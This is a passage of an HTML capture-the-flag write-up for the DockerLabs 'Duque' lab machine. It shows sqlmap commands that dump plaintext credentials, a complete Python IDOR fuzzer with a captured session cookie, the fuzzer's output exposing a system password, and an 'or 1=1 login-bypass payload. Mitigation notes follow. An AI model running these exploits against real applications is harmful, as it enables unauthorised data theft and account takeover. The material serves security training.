+                <span class="cmd-label">SQLMAP COLUMNS</span>
+                <div><span class="prompt">$ </span><span class="cmd">sqlmap <span class="flag">-r</span> <span class="arg">request.txt</span> <span class="flag">-D</span> <span class="arg">register</span> <span class="flag">-T</span> <span class="arg">users</span> <span class="flag">--columns</span> <span class="flag">--batch</span></span></div>
+            </div>
+            <div class="output-block">
+                <div>Database: <span class="o-accent">register</span>&nbsp;&nbsp;Table: <span class="o-ok">users</span></div>
+                <div>[3 columns]</div>
+                <div>+----------+-------------+</div>
+                <div>| Column&nbsp;&nbsp; | Type&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|</div>
+                <div>+----------+-------------+</div>
+                <div>| id&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | int(11)&nbsp;&nbsp;&nbsp;&nbsp; |</div>
+                <div class="o-warn">| passwd&nbsp;&nbsp; | varchar(50) |</div>
+                <div class="o-warn">| username | varchar(50) |</div>
+                <div>+----------+-------------+</div>
+            </div>
+
+            <div class="step-marker"><div class="step-num">8</div><span class="step-title">Dump credentials — SQLMap --dump</span></div>
+            <div class="prose">
+                <p>With the column names confirmed, we dump all records from the <code>users</code> table specifying the columns explicitly with <span class="hl-pur">-C id,username,passwd</span> and <span class="hl-pur">--dump</span>. SQLMap extracts three entries in plaintext. The <span class="hl-bad">admin</span> account with password <span class="hl-bad">admin123</span> is our entry point into the authenticated panel.</p>
+            </div>
+            <div class="cmd-block" data-cmd="sqlmap -r request.txt -D register -T users -C id,username,passwd --dump --batch">
+                <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                <span class="cmd-label">SQLMAP DUMP</span>
+                <div><span class="prompt">$ </span><span class="cmd">sqlmap <span class="flag">-r</span> <span class="arg">request.txt</span> <span class="flag">-D</span> <span class="arg">register</span> <span class="flag">-T</span> <span class="arg">users</span> <span class="flag">-C</span> <span class="arg">id,username,passwd</span> <span class="flag">--dump</span> <span class="flag">--batch</span></span></div>
+            </div>
+            <div class="output-block">
+                <div>Database: <span class="o-accent">register</span>&nbsp;&nbsp;Table: <span class="o-ok">users</span>&nbsp;&nbsp;[3 entries]</div>
+                <div>+----+----------+-----------+</div>
+                <div>| id | username | passwd&nbsp;&nbsp;&nbsp; |</div>
+                <div>+----+----------+-----------+</div>
+                <div>| 1&nbsp; | mario&nbsp;&nbsp;&nbsp; | mario123&nbsp; |</div>
+                <div>| 2&nbsp; | jesus&nbsp;&nbsp;&nbsp; | jesus2026 |</div>
+                <div class="o-bad">| 3&nbsp; | admin&nbsp;&nbsp;&nbsp; | admin123&nbsp; |</div>
+                <div>+----+----------+-----------+</div>
+            </div>
+
+            <div class="step-marker"><div class="step-num">9</div><span class="step-title">Login as admin — access the panel</span></div>
+            <div class="prose">
+                <p>Using the dumped credentials <span class="hl-bad">admin</span> / <span class="hl-bad">admin123</span>, we log into the billing panel at <code>http://172.17.0.2/bills/</code>. The authenticated panel reveals two invoice entries accessible via the following URLs:</p>
+            </div>
+            <div class="output-block">
+                <div>http://172.17.0.2/bills/panel.php?id=<span class="o-ok">xya456</span></div>
+                <div>http://172.17.0.2/bills/panel.php?id=<span class="o-ok">xyu597</span></div>
+            </div>
+            <div class="warn-box">
+                <p class="warn-box-title">// IDOR pattern detected</p>
+                <p>Both IDs share the same structure: <strong>xy + [letter] + [3 digits]</strong>. This predictable, sequential-style pattern is a hallmark of <strong>Insecure Direct Object References</strong>. If the server does not enforce authorisation checks on each ID, any valid-format ID could return invoice data regardless of ownership — including invoices belonging to other users.</p>
+            </div>
+        </div>
+
+        <hr class="divider">
+
+        <!-- 04 IDOR EXPLOITATION -->
+        <div class="section" id="idor">
+            <p class="section-label">// 04</p>
+            <h2 class="section-title">IDOR Exploitation</h2>
+            <div class="section-line"></div>
+
+            <div class="step-marker"><div class="step-num">10</div><span class="step-title">Validate IDOR — BurpSuite Repeater</span></div>
+            <div class="prose">
+                <p>Before writing a full fuzzer, we verify the behaviour manually using <strong>BurpSuite Repeater</strong>. We craft a GET request with a random ID following the pattern — such as <code>id=xyu453</code> — and send it to the server. The response is always <span class="hl-ok">200 OK</span>, regardless of whether the ID exists or not. This means we cannot distinguish valid invoices from empty responses based on the HTTP status code alone.</p>
+                <p>However, inspecting the raw HTML reveals a critical difference: empty (non-existent) invoices produce a page of length <span class="hl">5899 bytes</span>, while invoices with actual content produce a larger response. This <strong>response-length differential</strong> is the discriminator we will use in our fuzzer.</p>
+            </div>
+            <div class="output-block">
+                <div class="o-white">GET /bills/panel.php?id=xyu453 HTTP/1.1</div>
+                <div>Host: 172.17.0.2</div>
+                <div>Cookie: <span class="o-warn">PHPSESSID=im7874jb6qsmcg8j68fba8lbng</span></div>
+                <div>&nbsp;</div>
+                <div>← HTTP/1.1 <span class="o-ok">200 OK</span>&nbsp;&nbsp; Length: <span class="o-bad">5899</span> — empty invoice (baseline)</div>
+            </div>
+
+            <div class="step-marker"><div class="step-num">11</div><span class="step-title">Build the fuzzer — fuzzer.py</span></div>
+            <div class="prose">
+                <p>We write a custom Python script that generates all possible IDs matching the <code>xy[a-z][000-999]</code> pattern — 26 × 1000 = <strong>26,000 combinations</strong>. For each ID, it sends a GET request with the authenticated session cookie and compares the response length against the known empty-invoice baseline of <span class="hl">5,899 bytes</span>. Any response with a different length indicates a valid invoice. A secondary check flags responses of exactly <span class="hl-bad">5,987 bytes</span>, identified as the fingerprint for invoices containing sensitive credential data.</p>
+            </div>
+            <div class="cmd-block"
+                data-cmd="&quot;&quot;&quot;&#10;=============================================================================&#10;  Script:       Custom IDOR Fuzzer &amp; Data Extractor&#10;  Author:       Fran (@franlrs)&#10;  Target:       Duque Machine (DockerLabs)&#10;  Description:  Fuzzing tool to exploit IDOR vulnerabilities by filtering &#10;                HTTP response lengths. Identifies hidden sensitive data.&#10;=============================================================================&#10;&quot;&quot;&quot;&#10;import requests&#10;import string&#10;&#10;# Target URL based on the provided HTTP request&#10;TARGET_URL = &quot;http://172.17.0.2/bills/panel.php&quot;&#10;&#10;# Headers copied exactly from the provided raw HTTP request to maintain session and format&#10;HEADERS = {&#10;    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0&quot;,&#10;    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,&#10;    &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;,&#10;    &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br&quot;,&#10;    &quot;Connection&quot;: &quot;keep-alive&quot;,&#10;    &quot;Cookie&quot;: &quot;wp-settings-time-1=1776015782; csrftoken=EjLf807KTLwPCpe1ywwXLNTQe08SFQfg; PHPSESSID=im7874jb6qsmcg8j68fba8lbng&quot;,&#10;    &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,&#10;    &quot;Priority&quot;: &quot;u=0, i&quot;&#10;}&#10;&#10;# The baseline length for a &quot;Not Found&quot; invoice&#10;FAILURE_LENGTH = 5899&#10;&#10;print(&quot;+&quot;*50)&#10;print(f&quot;[+] Starting fuzzing on {TARGET_URL}...&quot;)&#10;print(&quot;+&quot;*50)&#10;&#10;# Generate combinations: xy + [letter] + [000-999]&#10;&#10;try:&#10;    for letter in string.ascii_lowercase:&#10;        for i in range(1000):&#10;&#10;            fuzz_id = f&quot;xy{letter}{i:03d}&quot;&#10;            &#10;            params = {&#39;id&#39;: fuzz_id}&#10;&#10;            try:&#10;                response = requests.get(TARGET_URL, params=params, headers=HEADERS, timeout=5)&#10;                current_length = len(response.text)&#10;&#10;                # Check if the length is different from the standard failure length&#10;                if current_length != FAILURE_LENGTH:&#10;                    print(f&quot;[+] SUCCESS! ID found: {fuzz_id} | Status: {response.status_code} | Length: {current_length}&quot;)&#10;                    &#10;                    # Highlight the response that hides the password&#10;                    if current_length == 5987:&#10;                        print(f&quot;    [!] ^^^ SENSITIVE DATA ALERT (PASSWORD LIKELY HERE) ^^^&quot;)&#10;&#10;            except requests.exceptions.RequestException as e:&#10;                print(f&quot;[-] Connection error on ID {fuzz_id}: {e}&quot;)&#10;                continue&#10;&#10;except KeyboardInterrupt:&#10;    print(&quot;\n[!] Process stopped by user.&quot;)&#10;&#10;print(&quot;+&quot;*50)&#10;print(&quot;[+] Fuzzing finished.&quot;)&#10;print(&quot;+&quot;*50)">
+                <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                <span class="cmd-label">FUZZER.PY</span>
+                <div><span class="comment">"""</span></div>
+                <div><span class="comment">=============================================================================</span>
+                </div>
+                <div><span class="comment">&nbsp;&nbsp;Script:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Custom IDOR Fuzzer &amp; Data
+                        Extractor</span></div>
+                <div><span class="comment">&nbsp;&nbsp;Author:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Fran (@franlrs)</span></div>
+                <div><span class="comment">&nbsp;&nbsp;Target:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Duque Machine (DockerLabs)</span>
+                </div>
+                <div><span class="comment">&nbsp;&nbsp;Description:&nbsp;Fuzzing tool to exploit IDOR vulnerabilities by
+                        filtering</span></div>
+                <div><span
+                        class="comment">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HTTP
+                        response lengths. Identifies hidden sensitive data.</span></div>
+                <div><span class="comment">=============================================================================</span>
+                </div>
+                <div><span class="comment">"""</span></div>
+                <div><span class="cmd">import requests</span></div>
+                <div><span class="cmd">import string</span></div>
+                <div>&nbsp;</div>
+                <div><span class="comment"># Target URL based on the provided HTTP request</span></div>
+                <div><span class="arg">TARGET_URL</span> <span class="cmd">= "http://172.17.0.2/bills/panel.php"</span></div>
+                <div>&nbsp;</div>
+                <div><span class="comment"># Headers copied exactly from the provided raw HTTP request to maintain session and
+                        format</span></div>
+                <div><span class="arg">HEADERS</span> <span class="cmd">= {</span></div>
+                <div><span class="cmd">&nbsp;&nbsp;&nbsp;&nbsp;"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0)
+                        Gecko/20100101 Firefox/140.0",</span></div>
+                <div><span class="cmd">&nbsp;&nbsp;&nbsp;&nbsp;"Accept":
+                        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",</span></div>
+                <div><span class="cmd">&nbsp;&nbsp;&nbsp;&nbsp;"Accept-Language": "en-US,en;q=0.5",</span></div>
+                <div><span class="cmd">&nbsp;&nbsp;&nbsp;&nbsp;"Accept-Encoding": "gzip, deflate, br",</span></div>
+                <div><span class="cmd">&nbsp;&nbsp;&nbsp;&nbsp;"Connection": "keep-alive",</span></div>
+                <div><span class="cmd">&nbsp;&nbsp;&nbsp;&nbsp;"Cookie": "wp-settings-time-1=1776015782;
+                        csrftoken=EjLf807KTLwPCpe1ywwXLNTQe08SFQfg; PHPSESSID=im7874jb6qsmcg8j68fba8lbng",</span></div>
+                <div><span class="cmd">&nbsp;&nbsp;&nbsp;&nbsp;"Upgrade-Insecure-Requests": "1",</span></div>
+                <div><span class="cmd">&nbsp;&nbsp;&nbsp;&nbsp;"Priority": "u=0, i"</span></div>
+                <div><span class="cmd">}</span></div>
+                <div>&nbsp;</div>
+                <div><span class="comment"># The baseline length for a "Not Found" invoice</span></div>
+                <div><span class="arg">FAILURE_LENGTH</span> <span class="cmd">= 5899</span></div>
+                <div>&nbsp;</div>
+                <div><span class="cmd">print("+"*50)</span></div>
+                <div><span class="cmd">print(f"[+] Starting fuzzing on {TARGET_URL}...")</span></div>
+                <div><span class="cmd">print("+"*50)</span></div>
+                <div>&nbsp;</div>
+                <div><span class="comment"># Generate combinations: xy + [letter] + [000-999]</span></div>
+                <div>&nbsp;</div>
+                <div><span class="cmd">try:</span></div>
+                <div><span class="cmd">&nbsp;&nbsp;&nbsp;&nbsp;for <span class="flag">letter</span> in
+                        string.ascii_lowercase:</span></div>
+                <div><span class="cmd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for <span class="flag">i</span> in
+                        range(1000):</span></div>
+                <div>&nbsp;</div>
+                <div><span class="cmd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fuzz_id =
+                        f"xy{letter}{i:03d}"</span></div>
+                <div><span class="cmd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;params = {'id':
+                        fuzz_id}</span></div>
+                <div>&nbsp;</div>
+                <div><span class="cmd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:</span></div>
+                <div><span
+                        class="cmd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;response
+                        = requests.get(TARGET_URL, params=params, headers=HEADERS, timeout=5)</span></div>
+                <div><span
+                        class="cmd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;current_length
+                        = len(response.text)</span></div>
+                <div>&nbsp;</div>
+                <div><span
+                        class="cmd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span
+                        class="comment"># Check if the length is different from the standard failure length</span></div>
+                <div><span
+                        class="cmd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if
+                        current_length != FAILURE_LENGTH:</span></div>
+                <div><span
+                        class="cmd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f"[+]
+                        SUCCESS! ID found: {fuzz_id} | Status: {response.status_code} | Length: {current_length}")</span></div>
+                <div>&nbsp;</div>
+                <div><span
+                        class="cmd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span
+                        class="comment"># Highlight the response that hides the password</span></div>
+                <div><span
+                        class="cmd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if
+                        current_length == <span class="arg">5987</span>:</span></div>
+                <div><span
+                        class="cmd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f"&nbsp;&nbsp;&nbsp;&nbsp;[!]
+                        ^^^ SENSITIVE DATA ALERT (PASSWORD LIKELY HERE) ^^^")</span></div>
+                <div>&nbsp;</div>
+                <div><span class="cmd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except
+                        requests.exceptions.RequestException as e:</span></div>
+                <div><span
+                        class="cmd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f"[-]
+                        Connection error on ID {fuzz_id}: {e}")</span></div>
+                <div><span
+                        class="cmd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue</span>
+                </div>
+                <div>&nbsp;</div>
+                <div><span class="cmd">except KeyboardInterrupt:</span></div>
+                <div><span class="cmd">&nbsp;&nbsp;&nbsp;&nbsp;print("\n[!] Process stopped by user.")</span></div>
+                <div>&nbsp;</div>
+                <div><span class="cmd">print("+"*50)</span></div>
+                <div><span class="cmd">print("[+] Fuzzing finished.")</span></div>
+                <div><span class="cmd">print("+"*50)</span></div>
+            </div>
+
+            <div class="step-marker"><div class="step-num">12</div><span class="step-title">Run the fuzzer — credential disclosure</span></div>
+            <div class="prose">
+                <p>Running the fuzzer reveals ten valid invoice IDs. Nine of them return a length of <span class="hl">6,153 bytes</span> — valid but standard invoices. One ID — <span class="hl-bad">xyc724</span> — returns exactly <span class="hl-bad">5,987 bytes</span>, triggering the <strong>SENSITIVE DATA ALERT</strong>. Accessing this invoice through the browser reveals the credentials of the system user <span class="hl-ok">duque</span> / <span class="hl-ok">duquelaje81029557!</span>.</p>
+            </div>
+            <div class="cmd-block" data-cmd="python3 fuzzer.py">
+                <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                <span class="cmd-label">RUN FUZZER</span>
+                <div><span class="prompt">$ </span><span class="cmd">python3 <span class="arg">fuzzer.py</span></span></div>
+            </div>
+            <div class="output-block">
+                <div>++++++++++++++++++++++++++++++++++++++++++++++++++</div>
+                <div class="o-accent">[+] Starting fuzzing on http://172.17.0.2/bills/panel.php...</div>
+                <div>++++++++++++++++++++++++++++++++++++++++++++++++++</div>
+                <div class="o-ok">[+] SUCCESS! ID found: xya123 | Status: 200 | Length: 6153</div>
+                <div class="o-ok">[+] SUCCESS! ID found: xya456 | Status: 200 | Length: 6153</div>
+                <div class="o-ok">[+] SUCCESS! ID found: xya789 | Status: 200 | Length: 6153</div>
+                <div class="o-ok">[+] SUCCESS! ID found: xyb234 | Status: 200 | Length: 6153</div>
+                <div class="o-ok">[+] SUCCESS! ID found: xyb567 | Status: 200 | Length: 6153</div>
+                <div class="o-ok">[+] SUCCESS! ID found: xyb890 | Status: 200 | Length: 6153</div>
+                <div class="o-ok">[+] SUCCESS! ID found: xyc123 | Status: 200 | Length: 6153</div>
+                <div class="o-ok">[+] SUCCESS! ID found: xyc456 | Status: 200 | Length: 6153</div>
+                <div class="o-bad">[+] SUCCESS! ID found: xyc724 | Status: 200 | Length: 5987</div>
+                <div class="o-bad">&nbsp;&nbsp;&nbsp;&nbsp;[!] ^^^ SENSITIVE DATA ALERT (PASSWORD LIKELY HERE) ^^^</div>
+                <div class="o-ok">[+] SUCCESS! ID found: xyd234 | Status: 200 | Length: 6153</div>
+                <div>&nbsp;</div>
+                <div>++++++++++++++++++++++++++++++++++++++++++++++++++</div>
+                <div>[+] Fuzzing finished.</div>
+                <div>++++++++++++++++++++++++++++++++++++++++++++++++++</div>
+            </div>
+            <div class="output-block">
+                <div><span class="o-white">Invoice ID:</span> <span class="o-bad">xyc724</span></div>
+                <div>&nbsp;</div>
+                <div><span class="o-white">User:&nbsp;&nbsp;&nbsp;&nbsp;</span> <span class="o-ok">duque</span></div>
+                <div><span class="o-white">Password:</span> <span class="o-ok">duquelaje81029557!</span></div>
+            </div>
+            <div class="info-box">
+                <p class="info-box-title">// Lessons learned</p>
+                <p>The Duque machine exposes two critical misconfigurations that compound each other. <strong>SQL Injection</strong> results from using unsanitised user input directly in database queries — solved with prepared statements and parameterised queries. <strong>IDOR</strong> results from trusting client-supplied identifiers without server-side ownership validation — every request for a resource must verify that the authenticated user is authorised to access that specific object. <strong>Neither vulnerability requires a sophisticated attacker</strong>: both are well-documented, tool-assisted, and listed in the OWASP Top 10.</p>
+            </div>
+        </div>
+
+        <hr class="divider">
+
+        <!-- 05 COMMAND REFERENCE -->
+        <div class="section" id="cmdref">
+            <p class="section-label">// 05</p>
+            <h2 class="section-title">Command Reference</h2>
+            <div class="section-line"></div>
+            <div class="cmd-ref-grid">
+
+                <div class="cmd-ref-card">
+                    <div class="cmd-ref-name">gobuster dir</div>
+                    <div class="cmd-ref-syntax">gobuster dir -u &lt;URL&gt; -w &lt;wordlist&gt;</div>
+                    <div class="cmd-ref-desc">Directory and file brute-forcing tool. Sends HTTP requests for each entry in the wordlist and reports non-404 responses, mapping the application's hidden structure.</div>
+                    <ul class="cmd-ref-flags">
+                        <li><code>dir</code> — Directory/file enumeration mode</li>
+                        <li><code>-u</code> — Target URL</li>
+                        <li><code>-w</code> — Path to wordlist</li>
+                        <li><code>-t</code> — Number of concurrent threads</li>
+                        <li><code>-x</code> — File extensions to probe (e.g., php,html)</li>
+                        <li><code>-o</code> — Save output to file</li>
+                        <li><code>-b</code> — Status codes to blacklist</li>
+                    </ul>
+                </div>
+
+                <div class="cmd-ref-card">
+                    <div class="cmd-ref-name">sqlmap</div>
+                    <div class="cmd-ref-syntax">sqlmap -r &lt;request.txt&gt; --dbs --batch</div>
+                    <div class="cmd-ref-desc">Automated SQL injection detection and exploitation tool. Reads a raw HTTP request file, detects injection points, and extracts database content.</div>
+                    <ul class="cmd-ref-flags">
+                        <li><code>-r</code> — Load raw HTTP request from file</li>
+                        <li><code>--dbs</code> — Enumerate all databases</li>
+                        <li><code>-D</code> — Target specific database</li>
+                        <li><code>--tables</code> — Enumerate tables</li>
+                        <li><code>-T</code> — Target specific table</li>
+                        <li><code>--columns</code> — Enumerate columns</li>
+                        <li><code>-C</code> — Columns to dump (comma-separated)</li>
+                        <li><code>--dump</code> — Extract all data from table</li>
+                        <li><code>--batch</code> — Non-interactive, accept defaults</li>
+                    </ul>
+                </div>
+
+                <div class="cmd-ref-card">
+                    <div class="cmd-ref-name">BurpSuite (Proxy)</div>
+                    <div class="cmd-ref-syntax">Proxy → Intercept → Save request.txt</div>
+                    <div class="cmd-ref-desc">Web application testing platform. Acts as an HTTP/HTTPS proxy to capture, inspect, and modify requests in transit between the browser and the server.</div>
+                    <ul class="cmd-ref-flags">
+                        <li>Intercept and capture raw HTTP requests</li>
+                        <li>Repeater — replay and modify requests manually</li>
+                        <li>Intruder — payload-based parameter fuzzing</li>
+                        <li>Saved request used as input for SQLMap <code>-r</code></li>
+                        <li>Preserves session cookies and CSRF tokens</li>
+                    </ul>
+                </div>
+
+                <div class="cmd-ref-card">
+                    <div class="cmd-ref-name">fuzzer.py</div>
+                    <div class="cmd-ref-syntax">python3 fuzzer.py</div>
+                    <div class="cmd-ref-desc">Custom IDOR fuzzer written in Python. Generates all ID combinations matching the xy[a-z][000-999] pattern and filters valid responses by HTTP response length differential.</div>
+                    <ul class="cmd-ref-flags">
+                        <li>Generates <code>26 × 1000 = 26,000</code> combinations</li>
+                        <li>Baseline empty response: <code>5899 bytes</code></li>
+                        <li>Valid invoice fingerprint: <code>6153 bytes</code></li>
+                        <li>Sensitive data fingerprint: <code>5987 bytes</code></li>
+                        <li>Session cookie required in request headers</li>
+                        <li>Timeout: <code>5 seconds</code> per request</li>
+                    </ul>
+                </div>
+
+                <div class="cmd-ref-card">
+                    <div class="cmd-ref-name">SQL Injection payload</div>
+                    <div class="cmd-ref-syntax">'or 1=1-- -</div>
+                    <div class="cmd-ref-desc">Classic authentication bypass payload. Closes the SQL string context, injects a tautology, and comments out the remainder of the query — causing the WHERE clause to always return true.</div>
+                    <ul class="cmd-ref-flags">
+                        <li><code>'</code> — Closes the string context in the query</li>
+                        <li><code>or 1=1</code> — Tautology that always evaluates true</li>
+                        <li><code>-- -</code> — Comments out the remaining SQL</li>
+                        <li>Bypasses password validation entirely</li>
+                        <li>Fix: use prepared statements / parameterised queries</li>
+                    </ul>
+                </div>
+
+                <div class="cmd-ref-card">
+                    <div class="cmd-ref-name">auto_deploy.sh</div>
+                    <div class="cmd-ref-syntax">sudo bash auto_deploy.sh &lt;machine.tar&gt;</div>
+                    <div class="cmd-ref-desc">DockerLabs deployment script. Loads the machine image from a tar archive, spins up the container, assigns a local IP within the Docker bridge network, and cleans up on Ctrl+C.</div>
+                    <ul class="cmd-ref-flags">
+                        <li>Requires <code>sudo</code> for Docker network management</li>
+                        <li>Assigns IP in the <code>172.17.0.x</code> range</li>
+                        <li>Container is removed automatically on exit</li>
+                        <li>No persistent state between deployments</li>
+                    </ul>
+                </div>
+
+            </div>
+        </div>
+
+        <hr class="divider">
+
+        <!-- 06 GLOSSARY -->
+        <div class="section" id="glossary">
+            <p class="section-label">// 06</p>
+            <h2 class="section-title">Glossary</h2>
+            <div class="section-line"></div>
+            <div class="glos-grid">
+
+                <div class="glos-card">
+                    <div class="glos-term">SQL Injection (SQLi)</div>
+                    <div class="glos-def"><strong>SQL Injection</strong> is a code injection technique where an attacker inserts malicious SQL statements into an input field that is then executed by the backend database engine. It occurs when user-supplied data is not properly sanitised before being incorporated into a SQL query. Attack variants include <strong>authentication bypass</strong> (as used here), <strong>UNION-based extraction</strong> (retrieving data from other tables), <strong>blind SQLi</strong> (inferring data from boolean or time responses), and <strong>error-based extraction</strong>. Prevention requires the use of <code>prepared statements</code> with parameterised queries, which ensure user input is always treated as data, never as executable SQL code. SQLi has been listed in the <strong>OWASP Top 10</strong> consistently since the list's inception.</div>
+                </div>
+
+                <div class="glos-card">
+                    <div class="glos-term">IDOR — Insecure Direct Object Reference</div>
+                    <div class="glos-def"><strong>IDOR</strong> is an access control vulnerability that arises when an application uses user-controllable input — such as a URL parameter — to access objects directly without verifying that the requesting user is authorised to access that specific object. In the Duque machine, the <code>panel.php?id=</code> parameter directly references invoice records with no ownership check. IDOR is categorised under <strong>Broken Access Control</strong>, the number-one risk in the OWASP Top 10 (2021). Mitigations include: replacing direct references with <strong>indirect references</strong> (session-scoped mapping tables), enforcing <strong>server-side authorisation checks</strong> on every request, and generating unpredictable IDs using cryptographically secure random tokens (UUIDs).</div>
+                </div>
+
+                <div class="glos-card">
+                    <div class="glos-term">SQLMap</div>
+                    <div class="glos-def"><strong>SQLMap</strong> is an open-source penetration testing tool that automates the detection and exploitation of SQL injection vulnerabilities. It supports a wide range of database backends (MySQL, PostgreSQL, Oracle, MSSQL, SQLite, and others) and implements numerous injection techniques including <em>boolean-based blind</em>, <em>time-based blind</em>, <em>error-based</em>, <em>UNION query-based</em>, and <em>stacked queries</em>. The <code>-r</code> flag allows SQLMap to read a raw HTTP request file — preserving all headers, cookies, and the request body — making it ideal for POST-based injection points captured via a proxy. SQLMap is included by default in Kali Linux and Parrot OS.</div>
+                </div>
+
+                <div class="glos-card">
+                    <div class="glos-term">Directory Enumeration — Gobuster</div>
+                    <div class="glos-def"><strong>Directory enumeration</strong> is a reconnaissance technique that sends HTTP requests for paths derived from a wordlist, probing for content not linked from the application's visible interface. <strong>Gobuster</strong> is a Go-based tool that performs this at high speed with configurable concurrency. The wordlist used here — <code>directory-list-lowercase-2.3-medium.txt</code> from DirBuster — contains around 207,000 entries compiled from real-world web servers, making it highly effective at discovering common hidden paths. Other popular alternatives include <strong>ffuf</strong> and <strong>dirsearch</strong>.</div>
+                </div>
+
+                <div class="glos-card">
+                    <div class="glos-term">BurpSuite — HTTP Proxy &amp; Testing Platform</div>
+                    <div class="glos-def"><strong>BurpSuite</strong> is an integrated platform for web application security testing developed by PortSwigger. In its most common use, it operates as an intercepting HTTP/HTTPS proxy: traffic between the browser and the server is routed through Burp, where requests and responses can be captured, inspected, and modified in real time. The <strong>Repeater</strong> module allows replaying individual requests with manual modifications — ideal for confirming IDOR behaviour as demonstrated in this machine. Saving a raw request from the Proxy tab produces a file directly compatible with SQLMap's <code>-r</code> flag.</div>
+                </div>
+
+                <div class="glos-card">
+                    <div class="glos-term">Response Length Differential — Fuzzing Discriminator</div>
+                    <div class="glos-def">When an application always returns <strong>HTTP 200 OK</strong> regardless of whether a requested resource exists, traditional status-code-based fuzzing fails. A <strong>response length differential</strong> is an alternative discriminator: the assumption is that valid and invalid responses differ in byte size — because a populated page contains more data than an empty one. By establishing a <strong>baseline length</strong> for the "not found" response and filtering out any response matching that length, a fuzzer can effectively isolate valid hits. This technique is essential for IDOR fuzzing scenarios and is also applicable to subdomain enumeration, parameter brute-forcing, and credential stuffing where the server always responds with 200.</div>
+                </div>
+
+            </div>
+        </div>
+
+    </main>
+</div>
+
+<footer>
+    © Designed &amp; Built by <em>Fran</em> — Duque · DockerLabs Write-up · May 2026
+</footer>
+
+<script>
+    const navEl = document.getElementById('nav');
+    window.addEventListener('scroll', () => {
+        navEl.style.borderBottomColor = scrollY > 30
+            ? 'rgba(0,210,255,0.1)' : 'rgba(0,210,255,0.07)';
+    }, { passive: true });
+
+    window.addEventListener('scroll', () => {
+        const winScroll = document.documentElement.scrollTop;
+        const height = document.documentElement.scrollHeight - window.innerHeight;
+        const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+        document.getElementById('readingProgress').style.width = scrolled + '%';
+    }, { passive: true });
+
+    const sections = document.querySelectorAll('.section[id]');
+    const tocLinks = document.querySelectorAll('.toc-list a');
+    const tocObserver = new IntersectionObserver(entries => {
+        entries.forEach(e => {
+            if (e.isIntersecting) {
+                tocLinks.forEach(a => a.classList.remove('active'));
+                const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+                if (active) active.classList.add('active');
+            }
+        });
+    }, { rootMargin: '-20% 0px -65% 0px' });
+    sections.forEach(s => tocObserver.observe(s));
+
+    const obs = new IntersectionObserver(entries => {
+        entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
